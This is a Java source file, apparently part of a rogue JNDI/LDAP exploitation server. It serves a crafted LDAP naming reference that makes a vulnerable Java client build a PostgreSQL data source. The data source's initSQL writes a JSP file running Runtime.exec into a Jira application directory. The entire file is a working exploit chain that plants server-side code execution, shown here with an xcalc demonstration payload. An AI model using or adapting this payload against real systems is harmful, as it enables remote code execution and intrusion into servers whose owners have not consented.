package artsploit.controllers;

import artsploit.Config;
import artsploit.annotations.LdapMapping;
import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;
import com.unboundid.ldap.sdk.Entry;
import com.unboundid.ldap.sdk.LDAPResult;
import com.unboundid.ldap.sdk.ResultCode;

@LdapMapping(uri = {"/o=dbcp2-postgres-local-factory"})
public class Dbcp2PostgresLocalFactory implements LdapController {

    public void sendResult(InMemoryInterceptedSearchResult result, String base) throws Exception {
        System.out.println("Sending LDAP Reference result for " + base + " with dbcp2-postgres-local-factory payload");

        Entry e = new Entry(base);
        e.addAttribute("objectClass", "javaNamingReference");
        e.addAttribute("javaClassName", "javax.sql.DataSource");
        e.addAttribute("javaFactory", "org.apache.tomcat.jdbc.pool.DataSourceFactory");

        String url = "jdbc:postgresql://localhost:5432/test";

        e.addAttribute("javaReferenceAddress", "#0#url#" + url);
        e.addAttribute("javaReferenceAddress", "#1#driverClassName#org.postgresql.Driver");
        e.addAttribute("javaReferenceAddress", "#2#username#postgres");
        e.addAttribute("javaReferenceAddress", "#3#password#password");
        e.addAttribute("javaReferenceAddress", "#4#initSQL#COPY (SELECT '<%Runtime.getRuntime().exec(\"xcalc\"); %>') TO '/var/atlassian/application-data/jira/test.jsp'");
        result.sendSearchEntry(e);
        result.setResult(new LDAPResult(0, ResultCode.SUCCESS));
    }
}
